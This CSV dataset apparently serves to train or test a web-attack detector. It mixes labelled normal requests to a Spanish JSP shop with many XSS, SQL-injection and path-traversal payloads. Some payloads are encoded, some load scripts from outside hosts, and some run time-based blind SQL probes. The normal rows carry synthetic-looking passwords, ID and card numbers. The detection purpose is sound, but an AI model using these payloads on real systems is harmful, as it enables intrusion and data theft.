"<img src=""Mario Heiderich says that svg SHOULD not be executed trough image tags"" onerror=""javascript:document.write('\u003c\u0069\u0066\u0072\u0061\u006d\u0065\u0020\u0073\u0072\u0063\u003d\u0022\u0064\u0061\u0074\u0061\u003a\u0069\u006d\u0061\u0067\u0065\u002f\u0073\u0076\u0067\u002b\u0078\u006d\u006c\u003b\u0062\u0061\u0073\u0065\u0036\u0034\u002c\u0050\u0048\u004e\u0032\u005a\u0079\u0042\u0034\u0062\u0057\u0078\u0075\u0063\u007a\u0030\u0069\u0061\u0048\u0052\u0030\u0063\u0044\u006f\u0076\u004c\u0033\u0064\u0033\u0064\u0079\u0035\u0033\u004d\u0079\u0035\u0076\u0063\u006d\u0063\u0076\u004d\u006a\u0041\u0077\u004d\u0043\u0039\u007a\u0064\u006d\u0063\u0069\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u0070\u0062\u0057\u0046\u006e\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0045\u0070\u0049\u006a\u0034\u0038\u004c\u0032\u006c\u0074\u0059\u0057\u0064\u006c\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u007a\u0064\u006d\u0063\u0067\u0062\u0032\u0035\u0073\u0062\u0032\u0046\u006b\u0050\u0053\u004a\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u0079\u004b\u0053\u0049\u002b\u0050\u0043\u0039\u007a\u0064\u006d\u0063\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0048\u004e\u006a\u0063\u006d\u006c\u0077\u0064\u0044\u0035\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u007a\u004b\u0054\u0077\u0076\u0063\u0032\u004e\u0079\u0061\u0058\u0042\u0030\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u006b\u005a\u0057\u005a\u007a\u0049\u0047\u0039\u0075\u0062\u0047\u0039\u0068\u005a\u0044\u0030\u0069\u0059\u0057\u0078\u006c\u0063\u006e\u0051\u006f\u004e\u0043\u006b\u0069\u0050\u006a\u0077\u0076\u005a\u0047\u0056\u006d\u0063\u007a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0038\u005a\u0079\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0055\u0070\u0049\u006a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0067\u0050\u0047\u004e\u0070\u0063\u006d\u004e\u0073\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0059\u0070\u0049\u0069\u0041\u0076\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0038\u0064\u0047\u0056\u0034\u0064\u0043\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0063\u0070\u0049\u006a\u0034\u0038\u004c\u0033\u0052\u006c\u0065\u0048\u0051\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0043\u0039\u006e\u0050\u0069\u0041\u0067\u0043\u006a\u0077\u0076\u0063\u0033\u005a\u006e\u0050\u0069\u0041\u0067\u0022\u003e\u003c\u002f\u0069\u0066\u0072\u0061\u006d\u0065\u003e');""></img>",xss,0.494506655
global/titulo.jsp,normal,0.082517197
miembros/editar.jsp?modo=registro&login=lehar&password=d3s7ota5&nombre=Hip%F3lita&apellidos=Salvi%E0+Figuls&email=ince2%40flexinspect.cat&dni=18178277C&direccion=Calle+Alferez+Gonzalez+Moro+120+11-E&ciudad=Espl%FAs&cp=10294&provincia=A+Coru%F1a&ntc=3714419514854077&B1=Registrar,normal,0.936735826
miembros/imagenes/ogono.jpg,normal,0.261286443
publico/caracteristicas.jsp?id=1,normal,0.451288811
"<TABLE BACKGROUND=""javascript:javascript:alert(1)"">",xss,0.708293116
publico/productos.jsp,normal,0.023578181
.\\..\\.\\..\\.\\..\\.\\..\\{FILE},traversal,0.137041212
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},traversal,0.892362184
publico/pagar.jsp?modo=insertar&precio=5696&B1=Confirmar,normal,0.330107322
global/menum.jsp,normal,0.808662813
publico/carrito.jsp,normal,0.409074876
<svg><script ?>alert(1),xss,0.593925486
index.jsp,normal,0.83551132
miembros/imagenes/zarauz.jpg,normal,0.21107897
publico/pagar.jsp?modo=insertar&precio=66&B1=Pasar+por+caja,normal,0.79081643
miembros/index.jsp,normal,0.91494547
miembros/imagenes/zarauz.jpg,normal,0.438897644
global/titulo.jsp,normal,0.143420525
"<META HTTP-EQUIV=""Link"" Content=""<http://ha.ckers.org/xss.css>; REL=stylesheet"">",xss,0.031419637
"<html onMouseOver html onMouseOver=""javascript:javascript:alert(1)""></html onMouseOver>",xss,0.021682812
<scr<script>ipt>alert(document.cookie)</scr</script>ipt>,xss,0.495564021
..\..\..\{FILE},traversal,0.680059121
imagenes/1.gif,normal,0.082873965
publico/autenticar.jsp?modo=entrar&login=syrett&pwd=cU%E1KeRa&remember=on&B1=Entrar,normal,0.02499728
<script>%(payload)s</script>,xss,0.510994198
imagenes/cmenbul.gif,normal,0.365788056
"echo('IPT&gt;alert(\""XSS\"")&lt;/SCRIPT&gt;'); ?&gt;",xss,0.634271911
"""/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />",xss,0.854710391
miembros/salir.jsp,normal,0.207687628
"s.UEv: select * from users where id=1 or 1#"". union select null,version() -- 1",sqli,0.38674093
publico/miembros.jsp,normal,0.456222214
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.424050785
"<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(123)}),x</script>",xss,0.985538923
"<img \x47src=x onerror=""javascript:alert(1)"">",xss,0.397969542
<;SCRIPT SRC=//ha.ckers.org/.j>;,xss,0.943498636
<IMG SRC=”javascript:alert(‘XSS’);”>,xss,0.924393138
"ABC<div style=""x:expression\x5C(javascript:alert(1)"">DEF",xss,0.033475832
"o.UE1: select * from users where id=1 <@. union select 1,version() -- 1",sqli,0.351400203
%2e%2e/%2e%2e/{FILE},traversal,0.937594562
miembros/salir.jsp,normal,0.662052681
miembros/fotos.jsp,normal,0.213811812
"s&noU: select * from users where id='1' or $<\ union select 1,@@VERSION -- 1'",sqli,0.599604498
"""'`><\x00img src=xxx:x onerror=javascript:alert(1)>",xss,0.912524527
publico/registro.jsp?modo=registro&login=crosby&password=di874i0&nombre=Beda&apellidos=Soms+Gallaga&email=tyrell%40masqueclases.sr&dni=37871926B&direccion=Calle+Juan+Sebastian+Elcano%2C+157+11%3FB&ciudad=Buenavista&cp=39660&provincia=Palencia&ntc=5032561795933103&B1=Registrar,normal,0.697827673
imagenes/logo.gif,normal,0.073466251
'; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --,sqli,0.082416565
<script ~~~>alert(0%0)</script ~~~>,xss,0.43418343
imagenes/logo.gif,normal,0.349621946
imagenes/logo.gif,normal,0.685907457
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",xss,0.302531205
publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=39&cantidad=92&B1=A%F1adir+al+carrito,normal,0.815673289
miembros/index.jsp,normal,0.659826946
miembros/imagenes/ogono.jpg,normal,0.560921384
index.jsp,normal,0.936643525
&lt;IFRAME SRC=http://ha.ckers.org/scriptlet.html &lt;,xss,0.413099506
imagenes/2.gif,normal,0.732532892
"&lt;IMG \""\""\""&gt;&lt;SCRIPT&gt;alert(\""XSS\"")&lt;/SCRIPT&gt;\""&gt;",xss,0.567534407
"&lt;BODY BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;",xss,0.237532576
miembros/editar.jsp?modo=registro&login=oblak&password=08Tiro72&nombre=Brisia&apellidos=Borrachero+Muros&email=swanson%40sexl.co&dni=51734480M&direccion=C%2F+Grabador+David+Roberts+154+1-H&ciudad=San+Mart%EDn+y+Mudri%E1n&cp=01169&provincia=Burgos&ntc=8961981301450385&B1=Registrar,normal,0.205615799
"<IMG SRC=""javascript:javascript:alert(1)""",xss,0.976455766
%%32%65%%32%65%%32%66{FILE},traversal,0.863982608
"""`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>",xss,0.776771902
index.jsp,normal,0.259373148
imagenes/cmenbul.gif,normal,0.823359896
"<img src=x\x09onerror=""javascript:alert(1)"">",xss,0.389213066
"' union (select NULL, NULL, NULL,  (select @@version)) --",sqli,0.044837295
0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE},traversal,0.671542402
imagenes/3.gif,normal,0.648047708
&lt;IMG&#x0D;SRC&#x0D;=&#x0D;&quot;&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;(&#x0D;&apos;&#x0D;X&#x0D;S&#x0D;S&#x0D;&apos;&#x0D;)&#x0D;&quot;&#x0D;&gt;&#x0D;,xss,0.108522623
"<a/href=""javascript:&#13; javascript:prompt(1)""><input type=""X"">",xss,0.307448978
imagenes/2.gif,normal,0.033918208
"s{)s: select * from users where id=1 or ""{)"" or 1=1 -- 1",sqli,0.182217374
1\'1,sqli,0.206881568
"<img SRC="" &#14; javascript:document.vulnerable=true;"">",xss,0.008164284
../../../../../../../../../../../../boot.ini,traversal,0.148065214
publico/carrito.jsp,normal,0.148626411
"<applet onReadyStateChange applet onReadyStateChange=""javascript:javascript:alert(1)""></applet onReadyStateChange>",xss,0.637728247
publico/pagar.jsp?modo=insertar&precio=9006&B1=Confirmar,normal,0.173571208
publico/registro.jsp?modo=registro&login=keighley&password=ca26lot9&nombre=Denice&apellidos=Mompel+Urdi&email=harkin%40escapadajoven.gq&dni=11696227Z&direccion=Calle+Fresno%2C+66%2C+10%3FD&ciudad=Valdehorna&cp=17743&provincia=Valladolid&ntc=7840274194886704&B1=Registrar,normal,0.646703523
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,xss,0.225058214
/../../../../../../../../../../../boot.ini%00.jpg,traversal,0.431728629
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},traversal,0.320812682
imagenes/2.gif,normal,0.962067076
"`""'><img src=xxx:x \x00onerror=javascript:alert(1)>",xss,0.874399004
publico/registro.jsp?modo=registro&login=lowietje&password=fal429a&nombre=Amelia&apellidos=Masana+Molera&email=guize_ranson%40infotek.bn&dni=69320452Q&direccion=Concejo+De+Alzuza%2C+47%2C+&ciudad=Valdelagua+del+Cerro&cp=42142&provincia=%C1vila&ntc=7953040031397493&B1=Registrar,normal,0.356026435
publico/caracteristicas.jsp?id=2,normal,0.060366967
publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=92&B1=A%F1adir+al+carrito,normal,0.803763478
publico/pagar.jsp?modo=insertar&precio=3916&B1=Confirmar,normal,0.703067985
publico/miembros.jsp,normal,0.266645715
"'; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --",sqli,0.2851687
..%c1%9c..%c1%9c..%c1%9c..%c1%9c{FILE},traversal,0.740870138
imagenes/2.gif,normal,0.450517888
"<IMG SRC=x onseeking=""alert(String.fromCharCode(88,83,83))"">",xss,0.62276922
<script src=http://yoursite.com/your_files.js></script>,xss,0.885383794
"<style></style\x0A<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss,0.147777849
"<a href=""\xE2\x80\xA8javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.18171887
../../../../../{FILE},traversal,0.311095486
"<a href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click Me</a>",xss,0.026418015
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>',xss,0.958630532
imagenes/cmenbul.gif,normal,0.364092576
imagenes/logo.gif,normal,0.307176496
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.632168328
imagenes/cmenbul.gif,normal,0.552908678
veris-->group<svg/onload=alert(/XSS/)//,xss,0.355403832
"<iframe onReadyStateChange iframe onReadyStateChange=""javascript:javascript:alert(1)""></iframe onReadyStateChange>",xss,0.115223135
global/menum.jsp,normal,0.970449937
..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{FILE},traversal,0.074073
publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=39&cantidad=1&B1=A%F1adir+al+carrito,normal,0.549552096
global/estilos.css,normal,0.696059355
o.n&1: select * from users where id=1 <@.$ or 1=1 -- 1,sqli,0.308766626
imagenes/logo.gif,normal,0.183192532
"so()U: select * from users where id='1' + (\) union select 1,@@VERSION -- 1'",sqli,0.934407069
imagenes/3.gif,normal,0.353531658
"<img LOWSRC=""javascript:document.vulnerable=true;"">",xss,0.160134402
publico/autenticar.jsp?modo=entrar&login=monette&pwd=1ob20h9la3&remember=off&B1=Entrar,normal,0.476955203
global/creditos.jsp,normal,0.24297341
imagenes/nuestratierra.jpg,normal,0.747309321
<img/src=`` onerror=this.onerror=confirm(1) ,xss,0.440087351
<script>+-+-1-+-+alert(1)</script>,xss,0.922614085
global/estilos.css,normal,0.483640502
"'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --",sqli,0.570393679
"s?.s: select * from users where id=1 or ""]."" or 1=1 -- 1",sqli,0.563178716
%27%20or%201=1,sqli,0.838096878
"so(s: select * from users where id=1 or ""&("" or 1=1 -- 1",sqli,0.661884857
publico/autenticar.jsp?modo=entrar&login=metcalfe&pwd=FilAnTR%F3pIca&remember=on&B1=Entrar,normal,0.279131162
"d=\""alert('XSS');\\"")\"";",xss,0.051917303
"\"";document.vulnerable=true;;//",xss,0.843159912
global/estilos.css,normal,0.137200916
*(|(objectclass=*)),sqli,0.681697648
imagenes/1.gif,normal,0.985891146
"&lt;SCRIPT a=\""&gt;\"" SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",xss,0.983454685
imagenes/logo.gif,normal,0.667053398
global/creditos.jsp,normal,0.745017096
global/estilos.css,normal,0.17644886
global/creditos.jsp,normal,0.731504179
miembros/imagenes/castro.jpg,normal,0.718846217
publico/autenticar.jsp?modo=entrar&login=odden&pwd=8030e&remember=on&B1=Entrar,normal,0.890212753
imagenes/nuestratierra.jpg,normal,0.461027326
miembros/salir.jsp,normal,0.30584691
..%%35%63{FILE},traversal,0.680174998
"<IMG SRC=x ondragend=""alert(String.fromCharCode(88,83,83))"">",xss,0.430260712
imagenes/cmenbul.gif,normal,0.897551998
"<html><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS<SCRIPT DEFER>document.vulnerable=true</SCRIPT>""></BODY></html>",xss,0.098715976
publico/pagar.jsp?modo=insertar&precio=8328&B1=Pasar+por+caja,normal,0.30120746
%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE},traversal,0.851621643
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215{FILE},traversal,0.329368441
index.jsp,normal,0.753762848
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",xss,0.231869053
publico/autenticar.jsp?modo=entrar&login=rong&pwd=d6mnificar&remember=off&B1=Entrar,normal,0.54954319
%uff0e%uff0e/%uff0e%uff0e/{FILE},traversal,0.693915968
%2e%2e%2f%2e%2e%2f{FILE},traversal,0.486146497
publico/autenticar.jsp?modo=entrar&login=jacobsen&pwd=ayunQue&remember=on&B1=Entrar,normal,0.736705059
"</ foo=""><script>javascript:alert(1)</script>"">",xss,0.961301996
"s,o1&: select * from users where id=1 or 1#"",=1 or 1=1 -- 1",sqli,0.985974708
imagenes/1.gif,normal,0.087620022
publico/miembros.jsp,normal,0.917532883
imagenes/cmenbul.gif,normal,0.710783031
.o&1c: select * from users where id=1. <@ or 1=1 -- 1,sqli,0.925737089
global/menum.jsp,normal,0.126262547
admin' #,sqli,0.552998571
publico/miembros.jsp,normal,0.749282976
index.jsp,normal,0.916131437
miembros/index.jsp,normal,0.50132674
publico/caracteristicas.jsp?id=1,normal,0.71761178
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.916148306
imagenes/logo.gif,normal,0.145092244
publico/pagar.jsp?modo=insertar&precio=1152&B1=Pasar+por+caja,normal,0.31559241
"`""'><img src=xxx:x \x0Conerror=javascript:alert(1)>",xss,0.697709255
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../{FILE},traversal,0.869149504
"<iframe  src=""&Tab;javascript:prompt(1)&Tab;"">",xss,0.222430065
miembros/fotos.jsp,normal,0.367566318
&o1&1: select * from users where id=1 or \<1 or 1=1 -- 1,sqli,0.718021792
imagenes/cmenbul.gif,normal,0.530113872
imagenes/logo.gif,normal,0.322631717
<IMG SRC=&{javascript:alert(1);};>,xss,0.912627737
"s.?s: select * from users where id=1 or "".]"" or 1=1 -- 1",sqli,0.014947164
<script>({0:#0=alert/#0#/#0#(0)})</script>,xss,0.453656316
"&1ovc: select * from users where id=1 or 1&@#=1 union select 1,version() -- 1",sqli,0.943734103
global/menum.jsp,normal,0.194072063
miembros/imagenes/ogono.jpg,normal,0.155717645
global/creditos.jsp,normal,0.688239703
publico/pagar.jsp?modo=insertar&precio=8715&B1=Confirmar,normal,0.778161922
"ABC<div style=""x:\x00expression(javascript:alert(1)"">DEF",xss,0.201412966
publico/registro.jsp?modo=registro&login=farlay&password=escribida&nombre=Nela&apellidos=Magrans+Ribes&email=tchistyakov-linn-baker%40pool-control.tw&dni=12361918Q&direccion=Guipuzcoa+198%2C+1%3FD&ciudad=Villanueva+de+Sigena&cp=25300&provincia=Guip%FAzcoa&ntc=6545971193644202&B1=Registrar,normal,0.710377918
"""><img src=x onerror=javascript:alert('A')>",xss,0.765306773
publico/caracteristicas.jsp?id=1,normal,0.938829802
miembros/imagenes/zarauz.jpg,normal,0.587960062
"<div/onmouseover='alert(1)'> style=""x:"">",xss,0.424450597
<script\x0C>javascript:alert(1)</script>,xss,0.909814248
"<IMG SRC=""livescript:[code]"">",xss,0.238501429
publico/autenticar.jsp?modo=entrar&login=pearce&pwd=coRDiTa&remember=on&B1=Entrar,normal,0.289311542
%2e%2e\%2e%2e\{FILE},traversal,0.515223734
&#X00003c,xss,0.054779607
miembros/editar.jsp?modo=registro&login=hoyer&password=poli8%E1l2a&nombre=Gema&apellidos=Magriny%E0&email=delaune%40tintasultravioleta.io&dni=08806627L&direccion=Av.+De+La+Reina+Sofia+151+&ciudad=Poboleda&cp=43700&provincia=Guadalajara&ntc=3288111380573813&B1=Registrar,normal,0.398966002
"><h1><IFRAME width=""420"" height=""315"" frameborder=""0"" onmouseover=""document.location.href='https://www.youtube.com/channel/UC9Qa_gXarSmObPX3ooIQZr",xss,0.917765969
miembros/imagenes/zarauz.jpg,normal,0.07611966
<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28&<WBR>#x27&#x58&#x53&#x53&#x27&#x29>,xss,0.962860159
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.456874151
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>,xss,0.67278614
........................................................................../../../../../../../../{FILE},traversal,0.628319846
publico/carrito.jsp,normal,0.369233354
miembros/imagenes/castro.jpg,normal,0.200715504
"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss,0.181617381
miembros/editar.jsp?modo=registro&login=asawa&password=S4DsUDEStE&nombre=Rhett&apellidos=Venzal+Tamayo&email=whitehead.kogan%40lamarsrl.qa&dni=98585223R&direccion=C%2F+Naturopata+Diego+Prieto+58%2C+&ciudad=Piedramillera&cp=33120&provincia=Pontevedra&ntc=7058252446193830&B1=Registrar,normal,0.724337453
publico/caracteristicas.jsp?id=1,normal,0.686390082
"""`'><script>\xE2\x80\xA9javascript:alert(1)</script>",xss,0.074748805
imagenes/logo.gif,normal,0.040835446
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.463780482
global/menum.jsp,normal,0.548957225
index.jsp,normal,0.170127197
imagenes/2.gif,normal,0.99984244
publico/registro.jsp?modo=registro&login=nelia3&password=embel1e542&nombre=H%E9rcules&apellidos=Diez+Lizano&email=prueckner%40helicopter.com.gf&dni=33095587J&direccion=C%2F+Afrodita+160%2C+5%3FB&ciudad=Vistabella&cp=06894&provincia=Huelva&ntc=0367766571989021&B1=Registrar,normal,0.079394325
miembros/imagenes/zarauz.jpg,normal,0.025323071
..\\\..\\\..\\\..\\\..\\\..\\\{FILE},traversal,0.184116935
<<SCRIPT>%(payload)s//<</SCRIPT>,xss,0.115898018
miembros/fotos.jsp,normal,0.969145541
publico/miembros.jsp,normal,0.111156716
admin' or '1'='1'--,sqli,0.751414477
miembros/imagenes/castro.jpg,normal,0.65990932
"""/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />",xss,0.524586382
"<img\x32src=x onerror=""javascript:alert(1)"">",xss,0.319999554
"UE1o,: select * from users where id=1 union select 1<@,version() -- 1",sqli,0.082920775
"<iframe onload iframe onload=""javascript:javascript:alert(1)""></iframe onload>",xss,0.930305572
global/titulo.jsp,normal,0.242391284
miembros/index.jsp,normal,0.808175421
